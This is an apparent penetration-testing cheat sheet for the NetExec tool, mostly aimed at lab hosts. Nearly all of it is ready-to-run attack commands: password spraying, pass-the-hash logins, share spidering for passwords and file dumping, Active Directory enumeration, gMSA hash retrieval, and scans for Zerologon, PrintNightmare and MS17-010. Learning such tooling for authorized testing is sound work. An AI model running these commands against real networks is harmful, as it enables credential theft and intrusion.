## Wiki:
For more commands and all capabilities.
```text
https://www.netexec.wiki/
```
## Supported Protocols:
All can be used for password spraying etc.
```bash
mssql               
smb                
ftp                 
ldap               
nfs                 
rdp                
ssh                
vnc                
winrm             
wmi                
```
## Supported Auth Methods:
```bash
#Null Session (SMB Anonymous)
nxc smb 172.16.139.3 -u '' -p ''

#Default User/Pass:
nxc smb 172.16.139.3 -u john -p 'lol123!'

#NTLM:

nxc smb dc01.ad.trilocor.local -u 'john' -H 3135834fa2e5dcdc4367de1c9d0784a3

nxc smb dc01.ad.trilocor.local -u 'john' -H HASH:HASH

#Kerberos Ticket, requires a valid ticket to be present in klist:
nxc smb dc.rustykey.htb -k --use-kcache
```
---
## Command Cheat Sheet:

### Password Spraying:
```bash
#SMB example with userlist:
nxc smb 172.16.139.3 -u knownusernames.txt -p Welcome1
```
---
### Verifying validity of found credentials with SMB
```bash
#Shows if credentials are valid for SMB auth + Displays the hostname of the target 
nxc smb 172.16.139.3 -u john -p 'lol123!'

#Can also be ran across a subnet for password re-use possibilites.
nxc smb 172.16.139.0/24 -u john -p 'lol123!'
```
---
### SMB - Domain Enumeration:
```bash
#list shares + the user's access rights to said shares (R/W):
nxc smb dc01.mirage.htb -u john -p 'lol123!' --shares

#enumerate domain users:
nxc smb dc01.mirage.htb -u john -p 'lol123!' --users

#enumerate domain groups:
nxc smb dc01.mirage.htb -u john -p 'lol123!' --groups

#get domain password policy:
nxc smb dc01.mirage.htb -u john -p 'lol123!' --pass-pol

```
---
### SMB - Spidering SMB Shares:
```bash
#Standard Spider on a selected share using pattern for keyword to search for:
nxc smb dc01.mirage.htb -u john -p 'lol123!' --spider 'Department Files' --content --pattern "passw"

#Search C Drive for pattern:
nxc smb dc01.mirage.htb -u john -p 'lol123!' --spider C\$ --pattern txt

#Spider Plus Share Enumeration:
nxc smb dc01.mirage.htb -u john -p 'lol123!' -M spider_plus

#Dump all files after spidering:
nxc smb dc01.mirage.htb -u john -p 'lol123!' -M spider_plus -o DOWNLOAD_FLAG=True
```
---
### SMB - Scanning for Common Vulns:
```bash
#Zerologon:
nxc smb dc01.mirage.htb -u '' -p '' -M zerologon

#noPAC:
nxc smb dc01.mirage.htb -u '' -p '' -M nopac

#PrintNightmare:
nxc smb dc01.mirage.htb -u '' -p '' -M printnightmare

#SMBGhost:
nxc smb dc01.mirage.htb -u '' -p '' -M smbghost

#MS17-010: 
nxc smb dc01.mirage.htb -u '' -p '' -M ms17-010

#NTLM Reflection - CVE-2025-33073 (Requires Creds):
nxc smb dc01.mirage.htb -u john -p 'lol123!' -M ntlm_reflection
```
---
### LDAP - Enumeration:
```bash
#Test creds for LDAP bind:
nxc ldap 10.10.10.0/24 -u john -p 'lol123!'

#Get domain SID:
nxc ldap dc01.mirage.htb -u john -p 'lol123!' --get-sid

#Get User Descriptions for password hunting:
nxc ldap dc01.mirage.htb -u john -p 'lol123!' -M get-desc-users

#Get All Admin users:
nxc ldap dc01.mirage.htb -u john -p 'lol123!' --admin-count

#Get DC IPs and Domain Trusts:
nxc ldap 10.10.14.23 -u john -p 'lol123!' --dc-list

#Extract subnets:
nxc ldap 10.10.14.23 -u john -p 'lol123!' -M get-network

#Find Misconfigured Delegations:
nxc ldap 192.168.56.11 -u eddard.stark -p FightP3aceAndHonor! --find-delegation
```
---
### LDAP - DACL and Delegations: 

##### Read GMSA if we have the ACL right:
```bash
#Retrieving password hash with ReadGMSAPassword priv:
nxc ldap ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$' --gmsa
```
#### Find Misconfigured Delegations:
```bash
#Finds all misconfigured delegations in the domain:
nxc ldap 192.168.56.11 -u eddard.stark -p FightP3aceAndHonor! --find-delegation

#Finds all users and computers with Unconstrained Delegation flag:
nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation
```
#### Read DACL rights on one or more targets:
```bash
nxc ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read
```
---
### LDAP - Running BloodHound Collector
```bash
nxc ldap dc01.administrator.htb -d administrator.htb -u Olivia -p ichliebedich --dns-server 10.129.61.1 --bloodhound -c All

#Collect the data from appointed zip location after it runs.
```
---
## MISC:
### NFS Share Enumeration in NXC:
```bash
#list all shares:
nxc nfs 10.129.254.128 --shares 

#List share content:
nxc nfs 10.129.254.128 --share '/MirageReports' --ls '/'
```
---
